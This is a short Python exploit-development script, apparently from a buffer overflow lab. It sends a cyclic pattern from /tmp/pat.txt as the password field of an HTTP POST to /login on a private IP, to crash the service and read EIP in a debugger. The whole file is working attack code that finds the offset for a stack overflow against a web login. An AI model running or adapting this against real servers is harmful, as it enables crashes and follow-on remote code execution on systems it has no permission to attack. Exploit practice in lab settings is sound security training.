#!/usr/bin/env python3
import socket

TARGET_IP   = '10.1.116.86'
TARGET_PORT = 80
PATH        = '/login'

# Read the exact pattern you just generated
with open('/tmp/pat.txt', 'r') as f:
    pattern = f.read().strip()

def send_pattern(pat):
    body = f"username=test&password={pat}"
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        "\r\n"
        f"{body}"
    )
    s = socket.socket(); s.settimeout(5)
    s.connect((TARGET_IP, TARGET_PORT))
    try:
        s.sendall(req.encode('latin-1'))
        s.recv(1024)
    except:
        pass
    finally:
        s.close()

if __name__ == '__main__':
    print("[*] Sending cyclic pattern to trigger crash...")
    send_pattern(pattern)
    print("[*] Done. Switch back to your debugger to inspect EIP.")
